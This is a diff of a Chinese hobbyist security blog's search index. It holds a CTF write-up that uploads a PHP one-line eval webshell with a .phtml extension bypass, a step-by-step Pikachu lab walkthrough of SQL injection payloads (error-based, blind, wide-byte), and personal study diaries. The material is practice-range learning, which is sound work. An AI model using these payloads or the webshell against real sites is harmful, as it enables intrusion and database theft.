@@ -38,17 +38,6 @@
       </categories>
   </entry>
   <entry>
-    <title>ACTF2020新生赛Upload</title>
-    <url>/2022/03/26/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BUpload/</url>
-    <content><![CDATA[<h3 id="发一些入门的CTF题目（Upload）"><a href="#发一些入门的CTF题目（Upload）" class="headerlink" title="发一些入门的CTF题目（Upload）"></a>发一些入门的CTF题目（Upload）<span id="more"></span></h3><p><strong>打开题目靶场发现是一个上传文件</strong><br><img src="/2022/03/26/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BUpload/%E9%A2%98%E7%9B%AE.png" alt="题目"><br><strong>尝试上传一句话木马</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><strong>提示报错</strong><br><img src="/2022/03/26/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BUpload/%E6%8F%90%E7%A4%BA.png" alt="提示"><br><strong>我们利用bp抓包，更改后缀名为phtml</strong><br>上传绕过不懂的可以看这个链接<br>转载<a href="https://blog.csdn.net/qq_38680693/article/details/81700378">https://blog.csdn.net/qq_38680693/article/details/81700378</a><br><img src="/2022/03/26/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BUpload/bp.png" alt="bp"><br><strong>访问网址利用hackbar工具查看flag</strong><br><img src="/2022/03/26/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BUpload/flag.png" alt="flag"></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-  </entry>
-  <entry>
     <title>GXYCTF2019Ping Ping Ping</title>
     <url>/2022/04/03/GXYCTF2019Ping-Ping-Ping/</url>
     <content><![CDATA[<h3 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping "></a>Ping Ping Ping <span id="more"></span></h3><p><strong>打开题目发现只有简单的&#x2F;?ip</strong><br><img src="/2022/04/03/GXYCTF2019Ping-Ping-Ping/timu.png" alt="题目"><br><strong>根据题目ping ping ping 猜测要ping ip 然后在url里尝试构造payload</strong></p>
@@ -69,6 +58,55 @@
 ]]></content>
       <categories>
         <category>CTF</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>ACTF2020新生赛Upload</title>
+    <url>/2022/03/26/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BUpload/</url>
+    <content><![CDATA[<h3 id="发一些入门的CTF题目（Upload）"><a href="#发一些入门的CTF题目（Upload）" class="headerlink" title="发一些入门的CTF题目（Upload）"></a>发一些入门的CTF题目（Upload）<span id="more"></span></h3><p><strong>打开题目靶场发现是一个上传文件</strong><br><img src="/2022/03/26/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BUpload/%E9%A2%98%E7%9B%AE.png" alt="题目"><br><strong>尝试上传一句话木马</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>提示报错</strong><br><img src="/2022/03/26/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BUpload/%E6%8F%90%E7%A4%BA.png" alt="提示"><br><strong>我们利用bp抓包，更改后缀名为phtml</strong><br>上传绕过不懂的可以看这个链接<br>转载<a href="https://blog.csdn.net/qq_38680693/article/details/81700378">https://blog.csdn.net/qq_38680693/article/details/81700378</a><br><img src="/2022/03/26/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BUpload/bp.png" alt="bp"><br><strong>访问网址利用hackbar工具查看flag</strong><br><img src="/2022/03/26/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BUpload/flag.png" alt="flag"></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Pikachu-SQL-Inject</title>
+    <url>/2022/05/15/Pikachu-SQL-Inject/</url>
+    <content><![CDATA[<h2 id="SQL-Inject篇"><a href="#SQL-Inject篇" class="headerlink" title="SQL-Inject篇"></a>SQL-Inject篇<span id="more"></span></h2><h4 id="1-数字型注入（POST）"><a href="#1-数字型注入（POST）" class="headerlink" title="1.数字型注入（POST）"></a>1.数字型注入（POST）</h4><p><img src="/2022/05/15/Pikachu-SQL-Inject/t1%E9%A2%98%E7%9B%AE.png" alt="t1题目"><br>根据下拉框先去尝试任意一个数字点击查询，发现url中并没有传参，提交方式为POST。然后我们点击数字1进行抓包测试<br><img src="/2022/05/15/Pikachu-SQL-Inject/t1burp1.png" alt="burp1"><br>发送到Repeater,进行payload</p>
+<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">id=<span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span> &amp;submit=<span class="meta">%</span>E<span class="number">6</span><span class="meta">%</span><span class="number">9</span>F<span class="meta">%</span>A<span class="number">5</span><span class="meta">%</span>E<span class="number">8</span><span class="meta">%</span>AF<span class="meta">%</span>A<span class="number">2</span></span><br></pre></td></tr></table></figure>
+<p>构造完成之后进行发包就可以看到页面将所有的用户和邮箱全部返回到页面上。<br><img src="/2022/05/15/Pikachu-SQL-Inject/t1.png" alt="t1end"></p>
+<h4 id="2-字符型注入（GET）"><a href="#2-字符型注入（GET）" class="headerlink" title="2.字符型注入（GET）"></a>2.字符型注入（GET）</h4><p><img src="/2022/05/15/Pikachu-SQL-Inject/t2%E9%A2%98%E7%9B%AE.png" alt="t2题目"><br>先随便尝试输入点击提交，页面返回用户名不存在，这时候发现请求在url内<br><img src="/2022/05/15/Pikachu-SQL-Inject/t2-2.png" alt="t2-2"><br>正常返回的话是用户名和邮箱，然后我们就要进行构造payload。字符串需要添加单引号闭合才可以，我们需要把前后两个单引号注释掉。构造payload</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">aaa</span>&#x27; or <span class="number">1</span>=<span class="number">1</span>--+</span><br></pre></td></tr></table></figure>
+<p>第一个单引号会将前面的单引号闭合，后面的–+号会注释掉后面的单引号。我们尝试提交。<br><img src="/2022/05/15/Pikachu-SQL-Inject/t2-3.png" alt="t2-3"><br>结果就会全部显示在页面上</p>
+<h4 id="3-搜索型注入"><a href="#3-搜索型注入" class="headerlink" title="3.搜索型注入"></a>3.搜索型注入</h4><p><img src="/2022/05/15/Pikachu-SQL-Inject/t3.png" alt="t3"><br>我们输入k，然后点击搜索发现包含k字符的用户名输出了<br><img src="/2022/05/15/Pikachu-SQL-Inject/t3-2.png" alt="t3-2"><br>发现和请求在url中然后根据上一题，直接构造payload</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">aaa</span>&#x27; or <span class="number">1</span>=<span class="number">1</span>--+</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/05/15/Pikachu-SQL-Inject/t3-3.png" alt="t3-3"><br>只要理解了，然后猜测后台如何拼接，设置合法的payload，构造闭合。</p>
+<h4 id="4-xx型注入"><a href="#4-xx型注入" class="headerlink" title="4.xx型注入"></a>4.xx型注入</h4><p><img src="/2022/05/15/Pikachu-SQL-Inject/t4.png" alt="t4"><br>进行尝试输入查询发现一直报错，然后构造payload发现是单引号＋括号闭合方式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aaa&#x27;) or 1=1--+</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/05/15/Pikachu-SQL-Inject/t4-2.png" alt="t4-2"></p>
+<h4 id="5-”Insert-x2F-Update”注入"><a href="#5-”Insert-x2F-Update”注入" class="headerlink" title="5.”Insert&#x2F;Update”注入"></a>5.”Insert&#x2F;Update”注入</h4><p><img src="/2022/05/15/Pikachu-SQL-Inject/t5.png" alt="t5"><br>点击注册，进行注册在提交的时候进行抓包<br><img src="/2022/05/15/Pikachu-SQL-Inject/t5-2.png" alt="t5-2"><br><img src="/2022/05/15/Pikachu-SQL-Inject/t5-3.png" alt="t5-3"><br>发现可以进行报错注入，构造payload可以进行爆库、爆表、爆字段、爆内容</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">updatexml</span>(<span class="number">1</span>,concat(<span class="number">0</span>x7e,database(),<span class="number">0</span>x7e),<span class="number">1</span>)and&#x27;&amp;password=aaa&amp;sex=aaa&amp;phonenum=aaa&amp;email=aaa&amp;add=aaa&amp;submit=submit</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/05/15/Pikachu-SQL-Inject/t5-4.png" alt="t5-3"><br>Update和Insert注入是一样的。</p>
+<h4 id="6-”Delete”注入"><a href="#6-”Delete”注入" class="headerlink" title="6.”Delete”注入"></a>6.”Delete”注入</h4><p><img src="/2022/05/15/Pikachu-SQL-Inject/t6.png" alt="t6"><br>提交一个留言然后点击删除进行抓包<br><img src="/2022/05/15/Pikachu-SQL-Inject/t6-2.png" alt="t6-2"><br>我们可以把id构造闭合</p>
+<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,database()),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<p>选中右键，convert selection，对其进行url编码。<br><img src="/2022/05/15/Pikachu-SQL-Inject/t6-3.png" alt="t6-3"><br>就可以进行爆库、爆表、爆字段、爆内容等流程了。</p>
+<h4 id="7-”http-header”注入"><a href="#7-”http-header”注入" class="headerlink" title="7.”http header”注入"></a>7.”http header”注入</h4><p><img src="/2022/05/15/Pikachu-SQL-Inject/t7.png" alt="t7"><br>点击提示获取账号密码然后点击登录进入页面<br><img src="/2022/05/15/Pikachu-SQL-Inject/t7-2.png" alt="t7-2"><br>点击退出进行抓包<br><img src="/2022/05/15/Pikachu-SQL-Inject/t7-3.png" alt="t7-3"><br>修改User-Agent,后面添加单引号’ 查看结果<br><img src="/2022/05/15/Pikachu-SQL-Inject/t7-4.png" alt="t7-4"><br>发现有注入点，然后我们构造payload</p>
+<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">&#x27;<span class="built_in"> or </span>updatexml(1,concat(0x7e,database()),0)<span class="built_in"> or </span>&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/05/15/Pikachu-SQL-Inject/t7-5.png" alt="t7-5"><br>得到数据库名。</p>
+<h4 id="8-盲注（base-on-boolian）"><a href="#8-盲注（base-on-boolian）" class="headerlink" title="8.盲注（base on boolian）"></a>8.盲注（base on boolian）</h4><p><img src="/2022/05/15/Pikachu-SQL-Inject/t8.png" alt="t8"><br>输入111查找不到，输入kebo是可以的然后构造payload</p>
+<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">kob<span class="string">e&#x27; and 1=1# (返回正确)</span></span><br><span class="line"><span class="string">kobe&#x27;</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span># (返回错误)</span><br></pre></td></tr></table></figure>
+<p>由此判断这里存在布尔盲注</p>
+<h4 id="9-盲注（base-on-time）"><a href="#9-盲注（base-on-time）" class="headerlink" title="9.盲注（base on time）"></a>9.盲注（base on time）</h4><p><img src="/2022/05/15/Pikachu-SQL-Inject/t9.png" alt="t9"><br>构造payload 查看两条语句的区别（sleep里面的参数是睡眠的时间为几秒）</p>
+<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">kobe</span><br><span class="line">kobe&#x27; <span class="keyword">and</span> <span class="built_in">sleep</span>(<span class="number">5</span>)<span class="meta">#</span></span><br></pre></td></tr></table></figure>
+<p>发现第二条语句会多加载5秒由此判断这里还有时间盲注。</p>
+<h4 id="10-宽字节注入"><a href="#10-宽字节注入" class="headerlink" title="10.宽字节注入"></a>10.宽字节注入</h4><p><img src="/2022/05/15/Pikachu-SQL-Inject/t10.png" alt="t10"><br>在BIG5和GBK编码中，两个字节代表一个汉字，因此我们可以在%5c也就是&#x2F;前面加上一个额外的编码如%df，来使mysql认为我们输入了%df%5c，从而把%5c吃掉，构造成了一个汉字。<br>所以我们进行抓包<br><img src="/2022/05/15/Pikachu-SQL-Inject/t10-2.png" alt="t10-2"><br>构造payload</p>
+<figure class="highlight haml"><table><tr><td class="code"><pre><span class="line"><span class="tag">%<span class="selector-tag">df</span></span>&#x27;or 1=1#</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/05/15/Pikachu-SQL-Inject/t10-3.png" alt="t10-3"></p>
+]]></content>
+      <categories>
+        <category>Pikachu靶场</category>
       </categories>
   </entry>
   <entry>
@@ -161,6 +199,16 @@
       </categories>
   </entry>
   <entry>
+    <title>week of 4.25</title>
+    <url>/2022/05/02/week-of-4-25/</url>
+    <content><![CDATA[<h2 id="The-biggest-lie-in-the-world-is-that-you-can’t！！！"><a href="#The-biggest-lie-in-the-world-is-that-you-can’t！！！" class="headerlink" title="The biggest lie in the world is that you can’t！！！ "></a>The biggest lie in the world is that you can’t！！！ <span id="more"></span></h2><h4 id="世界上最大的谎言就是你不行！！！"><a href="#世界上最大的谎言就是你不行！！！" class="headerlink" title="世界上最大的谎言就是你不行！！！"></a>世界上最大的谎言就是你不行！！！</h4><p><strong>这周的计划没什么太大变化</strong><br>一.日常<br>(1).坚持背单词<br>(2).刷题，看小迪安全，看群内师傅们的报告分享<br>二.CET4<br>(1).听力反复听<br>(2).题目仔细分析<br>三.西培千题斩<br>高数（时间足够可以多写）：<br>(1).文亮网课+西培千题斩（二周一个章节(题目除去通关篇)）<br>四.blog<br>(1).一篇周随笔<br>(2).CFT或者报告分享1到2篇吧<br><strong>最近两周blog也没啥操作分享是因为SQL注入真的好难，看小迪的视频得慢慢看还要打打靶场练习下所以就没发了，等之后靶场打完来分析下吧。</strong></p>
+<h4 id="share"><a href="#share" class="headerlink" title="share"></a>share</h4><p>这周其实还是比较平淡的，虽然说每天都是做着差不多的事情但是每天都会因为今天多学了一些东西感到开心。<br>唯独这周有位师傅送了我一个edu的高危漏洞让我很激动，因为我edu好久没出货了<br><img src="/2022/05/02/week-of-4-25/%E5%A4%8D%E7%8E%B0.png" alt="复现"><br>我去百度复现了一下发现搞不出来，然后一直上网查资料，然后就坐牢一天，有点超出我的当前能力范围……这就是学的不好的痛苦，别人送漏洞给你，但是你复现不出来，这种感觉巨难受。然后我最近就准备去请教一下那位师傅。<br>这周西电的CTF也在比赛了，靠着pz的关系混在了他们校内的比赛群里，在他们平台上做做题学习一下。<br>希望国内疫情可以好起来，我想出去玩，真的好想！！！<br><strong>继续努力提升自己吧.try my best！</strong></p>
+]]></content>
+      <categories>
+        <category>diary</category>
+      </categories>
+  </entry>
+  <entry>
     <title>week-of-4.18</title>
     <url>/2022/04/25/week-of-4-18/</url>
     <content><![CDATA[<h2 id="What-do-you-use-to-fight-the-confusion-of-this-life？"><a href="#What-do-you-use-to-fight-the-confusion-of-this-life？" class="headerlink" title="What do you use to fight the confusion of this life？ "></a>What do you use to fight the confusion of this life？ <span id="more"></span></h2><h4 id="你拿什么来对抗这一生的迷茫？"><a href="#你拿什么来对抗这一生的迷茫？" class="headerlink" title="你拿什么来对抗这一生的迷茫？"></a>你拿什么来对抗这一生的迷茫？</h4><p><strong>这一周过的很奇怪，感觉自己比前段时间放松很多尤其是周五到周日晚上摆到了极致</strong><br><strong>1.专升本plan</strong><br>还是照旧高数英语多刷题多背多写！！！每天都不能落下！！！<br><strong>2.网络安全plan</strong><br>因为学的不是很久所以还是得继续b站看视频，多听师傅们分享，多学习一些思路。漏洞啥的能复现就复现学一下，能挖出来就提交一个，挖洞也是很有成就感的事情，但是挖不出来就很坐牢。。。</p>
@@ -173,10 +221,9 @@
       </categories>
   </entry>
   <entry>
-    <title>week of 4.25</title>
-    <url>/2022/05/02/week-of-4-25/</url>
-    <content><![CDATA[<h2 id="The-biggest-lie-in-the-world-is-that-you-can’t！！！"><a href="#The-biggest-lie-in-the-world-is-that-you-can’t！！！" class="headerlink" title="The biggest lie in the world is that you can’t！！！ "></a>The biggest lie in the world is that you can’t！！！ <span id="more"></span></h2><h4 id="世界上最大的谎言就是你不行！！！"><a href="#世界上最大的谎言就是你不行！！！" class="headerlink" title="世界上最大的谎言就是你不行！！！"></a>世界上最大的谎言就是你不行！！！</h4><p><strong>这周的计划没什么太大变化</strong><br>一.日常<br>(1).坚持背单词<br>(2).刷题，看小迪安全，看群内师傅们的报告分享<br>二.CET4<br>(1).听力反复听<br>(2).题目仔细分析<br>三.西培千题斩<br>高数（时间足够可以多写）：<br>(1).文亮网课+西培千题斩（二周一个章节(题目除去通关篇)）<br>四.blog<br>(1).一篇周随笔<br>(2).CFT或者报告分享1到2篇吧<br><strong>最近两周blog也没啥操作分享是因为SQL注入真的好难，看小迪的视频得慢慢看还要打打靶场练习下所以就没发了，等之后靶场打完来分析下吧。</strong></p>
-<h4 id="share"><a href="#share" class="headerlink" title="share"></a>share</h4><p>这周其实还是比较平淡的，虽然说每天都是做着差不多的事情但是每天都会因为今天多学了一些东西感到开心。<br>唯独这周有位师傅送了我一个edu的高危漏洞让我很激动，因为我edu好久没出货了<br><img src="/2022/05/02/week-of-4-25/%E5%A4%8D%E7%8E%B0.png" alt="复现"><br>我去百度复现了一下发现搞不出来，然后一直上网查资料，然后就坐牢一天，有点超出我的当前能力范围……这就是学的不好的痛苦，别人送漏洞给你，但是你复现不出来，这种感觉巨难受。然后我最近就准备去请教一下那位师傅。<br>这周西电的CTF也在比赛了，靠着pz的关系混在了他们校内的比赛群里，在他们平台上做做题学习一下。<br>希望国内疫情可以好起来，我想出去玩，真的好想！！！<br><strong>继续努力提升自己吧.try my best！</strong></p>
+    <title>week of 4.4</title>
+    <url>/2022/04/11/week-of-4-4/</url>
+    <content><![CDATA[<h2 id="try-to-be-better！！！"><a href="#try-to-be-better！！！" class="headerlink" title="try to be better！！！"></a>try to be better！！！<span id="more"></span></h2><h4 id="上周制订的计划还在继续努力中，刷题和网课还是一个比较漫长路途"><a href="#上周制订的计划还在继续努力中，刷题和网课还是一个比较漫长路途" class="headerlink" title="上周制订的计划还在继续努力中，刷题和网课还是一个比较漫长路途"></a>上周制订的计划还在继续努力中，刷题和网课还是一个比较漫长路途</h4><p><strong>1.高数</strong><br>高数还是在系统的学习，上网课刷题。这两周的时间把高数第一章函数与极限给过了一遍加上配套的习题学的非常的充实。但是中间做有些题目是比较困难的，可能是因为第一次做的原因很多知识点没有想到，还是缺少刷题了，还要多刷题多整理题目。<br><strong>2.英语</strong><br>英语看过我周计划的人应该都知道我是分模块练习的，起初是按照周计划上来的题目数量，后来我感觉这样写题目写的有点少哈哈哈，然后我就开始准备两三天完成这些任务，当时高数也想提速的发现高数和英语真的不一样，高数题目做的不是很熟练所以写的会比较慢。<br>英语四级考试还有61天，我也要开始准备起来了！上次就差了一点点，这次我一定过！！！<br><strong>3.竞赛</strong><br>竞赛的事情因为疫情时间一直还没确定，平时看的也比较少。<br><strong>4.hacker！！！</strong><br>CTF的题目还没做明白，开始去寻找漏洞了，但是也小有所成，在edu src上寻找了一些中危和低危漏洞，很感谢huazhao分享了一个edu系统通杀！<br><img src="/2022/04/11/week-of-4-4/%E4%B8%AA%E4%BA%BA%E4%B8%BB%E9%A1%B5.png" alt="漏洞"><br>之后也会分享一些我的漏洞报告以及笔记分享，会单独放在一个分类里的。<br>还要继续努力，把以前浪费的时间补回来，卷起来！！！<br>逛b站看到一些感触很深的话<br><img src="/2022/04/11/week-of-4-4/%E5%88%86%E4%BA%AB.png" alt="分享"><br><strong>人为了自己而活，日后还有无限可能！！！</strong></p>
 ]]></content>
       <categories>
         <category>diary</category>
@@ -186,15 +233,6 @@
     <title>week of 5.2</title>
     <url>/2022/05/09/week-of-5-2/</url>
     <content><![CDATA[<h2 id="There-is-no-eternal-night-only-the-dawn-that-has-yet-to-come！"><a href="#There-is-no-eternal-night-only-the-dawn-that-has-yet-to-come！" class="headerlink" title="There is no eternal night, only the dawn that has yet to come！"></a>There is no eternal night, only the dawn that has yet to come！<span id="more"></span></h2><h4 id="没有永恒的黑夜，只有未到的黎明。"><a href="#没有永恒的黑夜，只有未到的黎明。" class="headerlink" title="没有永恒的黑夜，只有未到的黎明。"></a>没有永恒的黑夜，只有未到的黎明。</h4><p><strong>小小反思一下</strong><br>这周原本要打sql注入的靶场，然后在blog上分享一下的，但是最近事情比较多就稍微延迟了一下下。下周一定分享！！！<br><strong>Nervous</strong><br>感觉现在的生活每天都没有什么区别感觉像是陷入了循环……每天都在重复相似的事情背单词刷英语刷高数刷网安，每天的路线也是两点一线早起去机房晚上回寝室，就寝室机房寝室机房……也不知道能坚持多久。其实自己也非常担心自己每天努力这么久最终结果却不尽人意而感到焦虑，也感觉自己很会怨天尤人。而且最近很搞笑的是我居然看起了考研，一个专升本考试都还没考的人看起了考研的路线，虽然说有规划是好的，但是就莫名有时候觉得自己有些搞笑，但说心里话我心里我专升本上岸之后是准备想要考研的！！！希望都可以上岸，先提前加油一下！！！<br><strong>PLAN</strong><br>这周的计划也没什么太多的变化，就是英语四级考试只剩下一个月时间了，可能这个月的重心会放在英语上，上一次就差了一点点，这次一定要过！<br>一.日常<br>(1).坚持背单词<br>(2).刷题，看小迪安全，看群内师傅们的报告分享<br>二.CET4<br>(1).听力反复听<br>(2).题目仔细分析要精做<br>(3).背背作文模板<br>三.西培千题斩<br>高数（时间足够可以多写）：<br>(1).文亮网课+西培千题斩（二周一个章节(题目除去通关篇)）<br>英语<br>(1).做做阅读题、翻译题、作文(做一些和四级相关的题目多加训练)<br>四.blog<br>(1).一篇周随笔<br>(2).CFT或者报告分享1到2篇吧(看时间吧有时候可能事情也比较多，尽量达到)<br><strong>SHARE</strong><br>这个周末参加了校内CTF比赛总共两天两场，每天分为理论＋夺旗感觉做的还行，可能是校内的题目会比较简单吧不像那些大赛题，过段时间看看平台还有没有开放写写wp好了。<br>周日中午去了LY老师家吃饭，老师的手艺嘎嘎好，空手过去又感觉不太好意思然后去kfc买了6包牛排哈哈哈哈主要老师也健身就嘎嘎吃。也询问了一下自己心里的一些困惑，老师也给了我一些建议和方向，也很开心能在大学中可以和老师相处成为朋友哈哈哈哈。晚上回到机房也看到了日落晚霞浅浅拍个照片留念一下，而且这是我第一次修图！！！真的第一次<br><img src="/2022/05/09/week-of-5-2/wanxia.jpg" alt="晚霞"><br>这个周末怎么说呢虽然没有学习但是体验了一下生活中别样的乐趣！</p>
-]]></content>
-      <categories>
-        <category>diary</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>week of 4.4</title>
-    <url>/2022/04/11/week-of-4-4/</url>
-    <content><![CDATA[<h2 id="try-to-be-better！！！"><a href="#try-to-be-better！！！" class="headerlink" title="try to be better！！！"></a>try to be better！！！<span id="more"></span></h2><h4 id="上周制订的计划还在继续努力中，刷题和网课还是一个比较漫长路途"><a href="#上周制订的计划还在继续努力中，刷题和网课还是一个比较漫长路途" class="headerlink" title="上周制订的计划还在继续努力中，刷题和网课还是一个比较漫长路途"></a>上周制订的计划还在继续努力中，刷题和网课还是一个比较漫长路途</h4><p><strong>1.高数</strong><br>高数还是在系统的学习，上网课刷题。这两周的时间把高数第一章函数与极限给过了一遍加上配套的习题学的非常的充实。但是中间做有些题目是比较困难的，可能是因为第一次做的原因很多知识点没有想到，还是缺少刷题了，还要多刷题多整理题目。<br><strong>2.英语</strong><br>英语看过我周计划的人应该都知道我是分模块练习的，起初是按照周计划上来的题目数量，后来我感觉这样写题目写的有点少哈哈哈，然后我就开始准备两三天完成这些任务，当时高数也想提速的发现高数和英语真的不一样，高数题目做的不是很熟练所以写的会比较慢。<br>英语四级考试还有61天，我也要开始准备起来了！上次就差了一点点，这次我一定过！！！<br><strong>3.竞赛</strong><br>竞赛的事情因为疫情时间一直还没确定，平时看的也比较少。<br><strong>4.hacker！！！</strong><br>CTF的题目还没做明白，开始去寻找漏洞了，但是也小有所成，在edu src上寻找了一些中危和低危漏洞，很感谢huazhao分享了一个edu系统通杀！<br><img src="/2022/04/11/week-of-4-4/%E4%B8%AA%E4%BA%BA%E4%B8%BB%E9%A1%B5.png" alt="漏洞"><br>之后也会分享一些我的漏洞报告以及笔记分享，会单独放在一个分类里的。<br>还要继续努力，把以前浪费的时间补回来，卷起来！！！<br>逛b站看到一些感触很深的话<br><img src="/2022/04/11/week-of-4-4/%E5%88%86%E4%BA%AB.png" alt="分享"><br><strong>人为了自己而活，日后还有无限可能！！！</strong></p>
 ]]></content>
       <categories>
         <category>diary</category>
